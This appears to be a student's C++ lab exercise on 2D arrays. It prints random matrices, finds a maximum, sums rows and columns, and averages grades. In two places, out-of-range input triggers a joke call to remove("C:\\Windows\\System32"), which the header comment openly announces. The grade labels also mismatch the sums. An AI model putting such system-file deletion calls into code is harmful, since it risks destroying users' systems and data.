// Emanuel Wertman
// 2/12/25
// 2d arrays lab
// Extras: cool printing, and deletes user's system32 if they don't give a number between the range
#include <iostream>
#include <cstdio>
#include <iomanip>
using namespace std;

int main(){
    // Program 1
    srand(time(0));

    int rows;
    int cols;
    cout << "How many rows? \n>>> ";
    cin >> rows;
    cout << "How many columns? \n>>> ";
    cin >> cols;

    int arr[rows][cols];
    int curMax = 0;
    int maxRow = 0;
    int maxCol = 0;
    for (int i = 0; i < rows; i++){                             // Iterates through the matrix, prints it, and checks if it is larger than the last
        for (int j = 0; j < cols; j++){
            arr[i][j] = rand() % 51;
            cout << left << setw(4) << arr[i][j] << " ";
            if (arr[i][j] > curMax) {
                curMax = arr[i][j];
                maxRow = i;
                maxCol = j;
            }
        }
        cout << "\n\n";
    }

    cout << "Maximum Element: " << endl;                        // Prints info
    cout << "Value: " << curMax << endl;
    cout << "Row: " << maxRow << endl;
    cout << "Column: " << maxCol << endl;

    // Program 2

    int dimensions;
    double rowSum = 0;
    double colSum = 0;
    cout << "Enter size of matrix \n>>> ";
    cin >> dimensions;

    if (dimensions < 1 || dimensions > 10) {                    // If it is not in the range, it will delete the user's system32
        cout << "Ok funny guy, no more computer" << endl;
        remove("C:\\Windows\\System32");
        return 0;
    }

    int arr2[dimensions][dimensions];                           
    for (int i = 0; i < dimensions; i++) {                      // Sets the numbers and prints them
        for (int j = 0; j < dimensions; j++) {
            arr2[i][j] = rand() % 101;
            cout << left << setw(4) << arr2[i][j] << " ";
        }
        cout << "\n\n";
    }

    for (int i = 0; i < dimensions; i++) {
        for (int j = 0; j < dimensions; j++) {
            rowSum += arr2[i][j];                               // adds the sum of each element
            colSum += arr2[j][i];
        }
        cout << "Row " << i+1 << ":\n Sum = " << rowSum << "\n Average = " << rowSum/dimensions << endl;
        cout << "Column " << i+1 << ":\n Sum = " << colSum << "\n Average = " << colSum/dimensions << endl << endl;
        rowSum = 0;
        colSum = 0;
    }

    // Program 3

    int students;
    double sumMath = 0;
    double sumEnglish = 0;
    double sumScience = 0;
    cout << "Enter amount of students \n>>> ";
    cin >> students;

    if (students < 1 || students > 10) {
        cout << "Ok funny guy, no more computer" << endl;
        remove("C:\\Windows\\System32");
        return 0;
    }

    int grades [students][3];
    cout << left << setw(10) << "English" << setw(10) << "Math" << setw(10) << "Science" << endl;
    for (int i = 0; i < students; i++) {
        for (int j = 0; j < 3; j++) {
            grades[i][j] = rand() % 51 + 50;
            cout << left << setw(10) << grades[i][j] << " ";
        }
        cout << "\n";
    }

    for (int i = 0; i < students; i++) {
        sumMath += grades[i][0];
        sumEnglish += grades[i][1];
        sumScience += grades[i][2];
    }

    cout << "Average Scores: " << endl;
    cout << "  Math:" << sumMath/students << endl;
    cout << "  English:" << sumEnglish/students << endl;
    cout << "  Science:" << sumScience/students << endl;
    return 0;
}